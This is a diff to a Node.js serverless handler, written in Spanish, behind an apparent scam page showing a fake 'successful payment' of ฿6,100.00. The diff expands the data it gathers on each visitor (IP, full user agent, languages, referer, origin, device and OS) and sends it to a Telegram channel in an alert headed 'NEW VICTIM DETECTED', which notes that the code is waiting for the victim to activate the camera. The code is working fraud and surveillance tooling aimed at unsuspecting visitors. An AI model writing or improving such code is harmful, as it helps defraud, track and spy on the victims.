@@ -38,7 +38,7 @@ module.exports = async (req, res) => {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  // Obtener IP del usuario
+  // Obtener TODA la información posible
   const ip = req.headers['x-forwarded-for'] || 
              req.headers['x-real-ip'] || 
              req.connection?.remoteAddress || 
@@ -47,18 +47,48 @@ module.exports = async (req, res) => {
              'unknown';
              
   const userAgent = req.headers['user-agent'] || 'unknown';
+  const referer = req.headers['referer'] || 'Directo';
+  const acceptLanguage = req.headers['accept-language'] || 'unknown';
+  const acceptEncoding = req.headers['accept-encoding'] || 'unknown';
+  const origin = req.headers['origin'] || 'unknown';
   const timestamp = new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' });
 
-  // Enviar notificación a Telegram
-  const message = `🎯 <b>NUEVA VÍCTIMA DETECTADA</b>
-  
-📱 <b>IP:</b> <code>${ip}</code>
-🌐 <b>Navegador:</b> ${userAgent.substring(0, 50)}...
-⏰ <b>Hora:</b> ${timestamp}
-💰 <b>Monto mostrado:</b> ฿6,100.00
+  // Analizar User Agent para más detalles
+  let deviceType = 'Unknown';
+  let os = 'Unknown';
+  let browser = 'Unknown';
 
-🔍 La víctima está viendo la página de "pago exitoso"
-⚠️ Esperando que active la cámara...`;
+  if (userAgent.includes('Mobile') || userAgent.includes('Android')) deviceType = '📱 Móvil';
+  else if (userAgent.includes('Tablet') || userAgent.includes('iPad')) deviceType = '📱 Tablet';
+  else deviceType = '💻 Desktop';
+
+  if (userAgent.includes('Windows')) os = 'Windows';
+  else if (userAgent.includes('Mac')) os = 'macOS';
+  else if (userAgent.includes('Linux')) os = 'Linux';
+  else if (userAgent.includes('Android')) os = 'Android';
+  else if (userAgent.includes('iOS')) os = 'iOS';
+
+  if (userAgent.includes('Chrome')) browser = 'Chrome';
+  else if (userAgent.includes('Firefox')) browser = 'Firefox';
+  else if (userAgent.includes('Safari')) browser = 'Safari';
+  else if (userAgent.includes('Edge')) browser = 'Edge';
+
+  // Enviar notificación completa a Telegram
+  const message = `🎯 <b>NUEVA VÍCTIMA DETECTADA</b>
+
+📍 <b>IP:</b> <code>${ip}</code>
+${deviceType} <b>Dispositivo:</b> ${os}
+🌐 <b>Navegador:</b> ${browser}
+🗣️ <b>Idiomas:</b> ${acceptLanguage}
+🔗 <b>Origen:</b> ${referer}
+⏰ <b>Hora:</b> ${timestamp}
+💰 <b>Monto:</b> ฿6,100.00
+
+📋 <b>User Agent:</b>
+<code>${userAgent}</code>
+
+🔍 Víctima viendo página de "pago exitoso"
+⚠️ Esperando activación de cámara...`;
 
   // Enviar a Telegram de forma asíncrona
   sendToTelegram(message).catch(console.error);
